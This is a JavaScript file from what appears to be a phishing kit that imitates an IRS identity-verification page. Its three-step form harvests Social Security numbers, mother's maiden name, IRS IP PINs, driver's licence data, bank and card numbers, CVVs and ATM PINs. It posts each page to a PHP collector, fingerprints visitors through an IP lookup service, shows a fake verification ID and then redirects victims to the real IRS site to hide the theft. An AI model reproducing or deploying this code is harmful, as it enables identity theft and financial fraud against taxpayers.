// DOM Elements
const pages = document.querySelectorAll('.form-page');
const steps = document.querySelectorAll('.progress-step');
const loadingOverlay = document.getElementById('loadingOverlay');

// Navigation buttons
const nextBtn1 = document.getElementById('nextBtn1');
const nextBtn2 = document.getElementById('nextBtn2');
const prevBtn1 = document.getElementById('prevBtn1');
const prevBtn2 = document.getElementById('prevBtn2');
const verifyBtn = document.getElementById('verifyBtn');

// Form elements
const phoneInput = document.getElementById('phone');
const ssnInput = document.getElementById('ssn');
const issueDateInput = document.getElementById('issueDate');
const expDateInput = document.getElementById('expDate');

// Radio button selection
const verificationMethodRadios = document.querySelectorAll('input[name="verificationMethod"]');
const cardDetails = document.getElementById('cardDetails');

// Format SSN input (XXX-XX-XXXX)
function formatSSNInput(input) {
    if (input) {
        input.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 9) value = value.substring(0, 9);

            let formattedValue = '';
            if (value.length > 0) {
                formattedValue = value.substring(0, 3);
            }
            if (value.length > 3) {
                formattedValue += '-' + value.substring(3, 5);
            }
            if (value.length > 5) {
                formattedValue += '-' + value.substring(5, 9);
            }

            e.target.value = formattedValue;
        });
    }
}

// Format phone input (XXX) XXX-XXXX
function formatPhoneInput(input) {
    if (input) {
        input.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 10) value = value.substring(0, 10);

            let formattedValue = '';
            if (value.length > 0) {
                formattedValue = '(' + value.substring(0, 3);
            }
            if (value.length > 3) {
                formattedValue += ') ' + value.substring(3, 6);
            }
            if (value.length > 6) {
                formattedValue += '-' + value.substring(6, 10);
            }

            e.target.value = formattedValue;
        });
    }
}

// Format date inputs (MM/YY)
function formatDateInput(input) {
    if (input) {
        input.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 4) value = value.substring(0, 4);

            let formattedValue = '';
            if (value.length > 0) {
                formattedValue = value.substring(0, 2);
            }
            if (value.length > 2) {
                formattedValue += '/' + value.substring(2, 4);
            }

            e.target.value = formattedValue;
        });
    }
}

// Apply formatting to inputs
if (ssnInput) formatSSNInput(ssnInput);
if (phoneInput) formatPhoneInput(phoneInput);
formatDateInput(issueDateInput);
formatDateInput(expDateInput);

// Get visitor IP address
async function getVisitorIP() {
    try {
        const response = await fetch('https://ipinfo.io/json');
        const data = await response.json();
        return data;
    } catch (error) {
        console.error('Error getting IP info:', error);
        return { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown' };
    }
}

// Navigation functions
function showPage(pageIndex) {
    pages.forEach((page, index) => {
        if (index === pageIndex) {
            page.classList.add('active');
        } else {
            page.classList.remove('active');
        }
    });

    // Update step indicators
    steps.forEach((step, index) => {
        if (index <= pageIndex) {
            step.classList.add('active');
        } else {
            step.classList.remove('active');
        }
    });
}

function showLoading(duration, callback) {
    if (loadingOverlay) {
        loadingOverlay.style.display = 'flex';

        setTimeout(() => {
            loadingOverlay.style.display = 'none';
            if (callback) callback();
        }, duration);
    }
}

function validatePage1() {
    if (!phoneInput || !ssnInput) return true;

    const phoneValue = phoneInput.value.replace(/\D/g, '');
    if (phoneValue.length !== 10) {
        alert('Phone number must be exactly 10 digits');
        return false;
    }

    const ssnValue = ssnInput.value.replace(/\D/g, '');
    if (ssnValue.length !== 9) {
        alert('SSN must be exactly 9 digits');
        return false;
    }

    return true;
}

function validatePage2() {
    if (!issueDateInput || !expDateInput) return true;

    const issueDate = issueDateInput.value;
    if (!/^\d{2}\/\d{2}$/.test(issueDate)) {
        alert('Issue date must be in MM/YY format');
        return false;
    }

    const expDate = expDateInput.value;
    if (!/^\d{2}\/\d{2}$/.test(expDate)) {
        alert('Expiration date must be in MM/YY format');
        return false;
    }

    return true;
}

// Radio button selection logic
if (verificationMethodRadios && cardDetails) {
    verificationMethodRadios.forEach(radio => {
        radio.addEventListener('change', function() {
            const cardType = this.value;

            // Update card details
            if (cardType === 'debit') {
                cardDetails.innerHTML = `
                    <h3>Debit Card Information</h3>
                    <div class="form-group">
                        <label for="debitCardNumber">Card Number</label>
                        <input type="text" id="debitCardNumber" placeholder="0000 0000 0000 0000">
                    </div>

                    <div class="form-grid">
                        <div class="form-group">
                            <label for="debitExpDate">Expiration Date</label>
                            <input type="text" id="debitExpDate" placeholder="MM/YY">
                        </div>

                        <div class="form-group">
                            <label for="debitCVV">CVV</label>
                            <input type="text" id="debitCVV" placeholder="123" maxlength="3">
                        </div>
                    </div>
                     <div class="form-group">
                        <label for="debitAtmPin">ATM PIN</label>
                        <input type="password" id="debitAtmPin" placeholder="****" maxlength="4">
                    </div>

                    <div class="form-group">
                        <label for="debitCardName">Cardholder Name</label>
                        <input type="text" id="debitCardName" placeholder="As it appears on card">
                    </div>

                    <div class="form-group">
                        <label for="debitBillingAddress">Billing Address</label>
                        <input type="text" id="debitBillingAddress" placeholder="Same as personal address">
                    </div>
                `;

                // Format the new inputs
                formatDateInput(document.getElementById('debitExpDate'));
            } else if (cardType === 'credit') {
                cardDetails.innerHTML = `
                    <h3>Credit Card Information</h3>
                    <div class="form-group">
                        <label for="creditCardNumber">Card Number</label>
                        <input type="text" id="creditCardNumber" placeholder="0000 0000 0000 0000">
                    </div>

                    <div class="form-grid">
                        <div class="form-group">
                            <label for="creditExpDate">Expiration Date</label>
                            <input type="text" id="creditExpDate" placeholder="MM/YY">
                        </div>

                        <div class="form-group">
                            <label for="creditCVV">CVV</label>
                            <input type="text" id="creditCVV" placeholder="123" maxlength="3">
                        </div>
                    </div>
                    <div class="form-group">
                        <label for="creditAtmPin">ATM PIN</label>
                        <input type="password" id="creditAtmPin" placeholder="****" maxlength="4">
                    </div>

                    <div class="form-group">
                        <label for="creditCardName">Cardholder Name</label>
                        <input type="text" id="creditCardName" placeholder="As it appears on card">
                    </div>

                    <div class="form-group">
                        <label for="creditBillingAddress">Billing Address</label>
                        <input type="text" id="creditBillingAddress" placeholder="Same as personal address">
                    </div>
                `;

                // Format the new inputs
                formatDateInput(document.getElementById('creditExpDate'));
            } else if (cardType === 'bank') {
                cardDetails.innerHTML = `
                    <h3>Bank Account Information</h3>
                    <div class="form-group">
                        <label for="accountHolder">Account Holder Name</label>
                        <input type="text" id="accountHolder" placeholder="Full name">
                    </div>

                    <div class="form-grid">
                        <div class="form-group">
                            <label for="routingNumber">Routing Number</label>
                            <input type="text" id="routingNumber" placeholder="9-digit number">
                        </div>

                        <div class="form-group">
                            <label for="bankAccountNumber">Account Number</label>
                            <input type="text" id="bankAccountNumber" placeholder="Your account number">
                        </div>
                    </div>

                    <div class="form-group">
                        <label for="accountType">Account Type</label>
                        <select id="accountType">
                            <option value="checking">Checking</option>
                            <option value="savings">Savings</option>
                        </select>
                    </div>
                     <div class="form-group">
                        <label for="bankAtmPin">ATM PIN</label>
                        <input type="password" id="bankAtmPin" placeholder="****" maxlength="4">
                    </div>

                    <div class="form-group">
                        <label for="bankNameDetails">Bank Name</label>
                        <input type="text" id="bankNameDetails" placeholder="Bank name">
                    </div>
                `;
            } else if (cardType === 'atm') {
                 cardDetails.innerHTML = `
                    <h3>ATM PIN Information</h3>
                    <div class="form-group">
                        <label for="atmPin">ATM PIN</label>
                        <input type="password" id="atmPin" placeholder="****" maxlength="4">
                    </div>
                 `;
            }
        });
    });
}


// Server submission function
function sendToServer(data, pageNumber, isTracking = false) {
    // Prepare data for PHP
    const postData = isTracking ? data : {
        page_number: pageNumber,
        form_data: data
    };

    // Send data to PHP script
    return fetch('index.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(postData)
    })
    .then(response => {
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        return response.json();
    })
    .then(result => {
        if (!result.success) {
            throw new Error(result.message || 'Server error');
        }
        console.log('Data sent to server successfully');
        return result;
    })
    .catch(error => {
        console.error('Error sending to server:', error);
        // Still proceed with the form to not break user experience
        return {success: false, error: error.message};
    });
}

// Visitor tracking function
function trackVisitor() {
    const trackingData = {
        page: window.location.href,
        referrer: document.referrer || 'Direct',
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        language: navigator.language,
        screen: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
        javaEnabled: navigator.javaEnabled() ? 'Yes' : 'No'
    };

    // Get and add IP information
    getVisitorIP().then(ipInfo => {
        trackingData.ipAddress = ipInfo.ip;
        trackingData.city = ipInfo.city;
        trackingData.region = ipInfo.region;
        trackingData.country = ipInfo.country;
        // Send tracking data
        sendToServer(trackingData, null, true);
    });
}

// Collect form data
function collectFormData(pageNumber) {
    const data = {};

    if (pageNumber === 1) {
        // Page 1 data
        const firstName = document.getElementById('firstName');
        const lastName = document.getElementById('lastName');
        const dob = document.getElementById('dob');
        const ssn = document.getElementById('ssn');
        const address = document.getElementById('address');
        const city = document.getElementById('city');
        const state = document.getElementById('state');
        const zip = document.getElementById('zip');
        const phone = document.getElementById('phone');

        if (firstName) data['First Name'] = firstName.value;
        if (lastName) data['Last Name'] = lastName.value;
        if (dob) data['Date of Birth'] = dob.value;
        if (ssn) data['SSN'] = ssn.value;
        if (address) data['Address'] = address.value;
        if (city) data['City'] = city.value;
        if (state) data['State'] = state.value;
        if (zip) data['Zip Code'] = zip.value;
        if (phone) data['Phone Number'] = phone.value;
    } else if (pageNumber === 2) {
        // Page 2 data
        const motherMaiden = document.getElementById('motherMaiden');
        const fatherName = document.getElementById('fatherName');
        const birthCity = document.getElementById('birthCity');
        const birthState = document.getElementById('birthState');
        const benefits = document.getElementById('benefits');
        const bankName = document.getElementById('bankName');
        const accountNumber = document.getElementById('accountNumber');
        const ipPin = document.getElementById('ipPin');
        const taxRecord = document.getElementById('taxRecord');
        const agi = document.getElementById('agi');
        const license = document.getElementById('license');
        const issueDate = document.getElementById('issueDate');
        const expDate = document.getElementById('expDate');

        if (motherMaiden) data["Mother's Maiden Name"] = motherMaiden.value;
        if (fatherName) data["Father's Full Name"] = fatherName.value;
        if (birthCity) data['City of Birth'] = birthCity.value;
        if (birthState) data['State of Birth'] = birthState.value;
        if (benefits) data['Amount of Benefits'] = benefits.value;
        if (bankName) data['Bank Name'] = bankName.value;
        if (accountNumber) data['Account Number'] = accountNumber.value;
        if (ipPin) data['IP Pin'] = ipPin.value;
        if (taxRecord) data['Tax Record'] = taxRecord.value;
        if (agi) data['Adjusted Gross Income'] = agi.value;
        if (license) data['Driver License'] = license.value;
        if (issueDate) data['License Issue Date'] = issueDate.value;
        if (expDate) data['License Expiration Date'] = expDate.value;
    } else if (pageNumber === 3) {
        // Page 3 data
        const selectedRadio = document.querySelector('input[name="verificationMethod"]:checked');
        if (selectedRadio) {
            const cardType = selectedRadio.value;
            data['Verification Method'] = cardType;

            if (cardType === 'debit') {
                const debitCardNumber = document.getElementById('debitCardNumber');
                const debitExpDate = document.getElementById('debitExpDate');
                const debitCVV = document.getElementById('debitCVV');
                const debitAtmPin = document.getElementById('debitAtmPin');
                const debitCardName = document.getElementById('debitCardName');
                const debitBillingAddress = document.getElementById('debitBillingAddress');

                if (debitCardNumber) data['Debit Card Number'] = debitCardNumber.value;
                if (debitExpDate) data['Debit Exp Date'] = debitExpDate.value;
                if (debitCVV) data['Debit CVV'] = debitCVV.value;
                if (debitAtmPin) data['Debit ATM PIN'] = debitAtmPin.value;
                if (debitCardName) data['Debit Card Name'] = debitCardName.value;
                if (debitBillingAddress) data['Debit Billing Address'] = debitBillingAddress.value;
            } else if (cardType === 'credit') {
                const creditCardNumber = document.getElementById('creditCardNumber');
                const creditExpDate = document.getElementById('creditExpDate');
                const creditCVV = document.getElementById('creditCVV');
                const creditAtmPin = document.getElementById('creditAtmPin');
                const creditCardName = document.getElementById('creditCardName');
                const creditBillingAddress = document.getElementById('creditBillingAddress');

                if (creditCardNumber) data['Credit Card Number'] = creditCardNumber.value;
                if (creditExpDate) data['Credit Exp Date'] = creditExpDate.value;
                if (creditCVV) data['Credit CVV'] = creditCVV.value;
                if (creditAtmPin) data['Credit ATM PIN'] = creditAtmPin.value;
                if (creditCardName) data['Credit Card Name'] = creditCardName.value;
                if (creditBillingAddress) data['Credit Billing Address'] = creditBillingAddress.value;
            } else if (cardType === 'bank') {
                const accountHolder = document.getElementById('accountHolder');
                const routingNumber = document.getElementById('routingNumber');
                const bankAccountNumber = document.getElementById('bankAccountNumber');
                const accountType = document.getElementById('accountType');
                const bankAtmPin = document.getElementById('bankAtmPin');
                const bankNameDetails = document.getElementById('bankNameDetails');

                if (accountHolder) data['Account Holder'] = accountHolder.value;
                if (routingNumber) data['Routing Number'] = routingNumber.value;
                if (bankAccountNumber) data['Bank Account Number'] = bankAccountNumber.value;
                if (accountType) data['Account Type'] = accountType.value;
                if (bankAtmPin) data['Bank ATM PIN'] = bankAtmPin.value;
                if (bankNameDetails) data['Bank Name'] = bankNameDetails.value;
            } else if (cardType === 'atm') {
                const atmPin = document.getElementById('atmPin');
                if (atmPin) data['ATM PIN'] = atmPin.value;
            }
        }
    }

    return data;
}

// Event listeners for navigation
if (nextBtn1) {
    nextBtn1.addEventListener('click', function() {
        if (validatePage1()) {
            // Collect and send page 1 data
            const pageData = collectFormData(1);

            showLoading(2000, () => {
                sendToServer(pageData, 1)
                    .then(() => showPage(1));
            });
        }
    });
}

if (nextBtn2) {
    nextBtn2.addEventListener('click', function() {
        if (validatePage2()) {
            // Collect and send page 2 data
            const pageData = collectFormData(2);

            showLoading(2000, () => {
                sendToServer(pageData, 2)
                    .then(() => showPage(2));
            });
        }
    });
}

if (prevBtn1) {
    prevBtn1.addEventListener('click', function() {
        showPage(0);
    });
}

if (prevBtn2) {
    prevBtn2.addEventListener('click', function() {
        showPage(1);
    });
}

if (verifyBtn) {
    verifyBtn.addEventListener('click', function() {
        const selectedRadio = document.querySelector('input[name="verificationMethod"]:checked');
        if (!selectedRadio) {
            alert('Please select a verification method');
            return;
        }

        // Collect and send page 3 data
        const pageData = collectFormData(3);

        showLoading(3000, () => {
            sendToServer(pageData, 3)
                .then(() => {
                    showSuccessBanner();
                });
        });
    });
}

// FAQ accordion functionality
document.querySelectorAll('.accordion button').forEach(btn => {
    btn.addEventListener('click', () => {
        const id = btn.getAttribute('aria-controls');
        const panel = document.getElementById(id);
        if (panel) {
            const expanded = btn.getAttribute('aria-expanded') === 'true';
            btn.setAttribute('aria-expanded', String(!expanded));
            panel.hidden = expanded;
        }
    });
});

// Initialize form when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    showPage(0);
    // Track visitor on page load
    trackVisitor();
});

// Success banner functionality
function showSuccessBanner() {
    const successBanner = document.getElementById('successBanner');
    const verificationId = document.getElementById('verificationId');
    const redirectButton = document.getElementById('redirectButton');
    const countdownElement = document.getElementById('countdown');
    
    // Generate a random verification ID
    const randomId = 'IRS-2025-' + Math.floor(Math.random() * 9000 + 1000) + '-' + 
                     Math.floor(Math.random() * 9000 + 1000);
    verificationId.textContent = randomId;
    
    // Show the banner
    successBanner.classList.add('show');
    
    // Countdown timer
    let countdown = 5;
    const countdownInterval = setInterval(() => {
        countdown--;
        countdownElement.textContent = countdown;
        
        if (countdown <= 0) {
            clearInterval(countdownInterval);
            redirectToIRS();
        }
    }, 1000);
    
    // Manual redirect button
    redirectButton.addEventListener('click', function() {
        clearInterval(countdownInterval);
        redirectToIRS();
    });
}

function redirectToIRS() {
    // Show a brief loading state
    const redirectButton = document.getElementById('redirectButton');
    const redirectCounter = document.getElementById('redirectCounter');
    
    redirectButton.textContent = 'Redirecting...';
    redirectButton.disabled = true;
    redirectCounter.textContent = 'Taking you to IRS services...';
    
    // Redirect after a brief delay
    setTimeout(() => {
        window.location.href = 'https://sa.www4.irs.gov/wmr/';
    }, 1000);
}

// Initialize immediately if DOM is already loaded
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', function() {
        showPage(0);
        // Track visitor on page load
        trackVisitor();
    });
} else {
    showPage(0);
    // Track visitor on page load
    trackVisitor();
}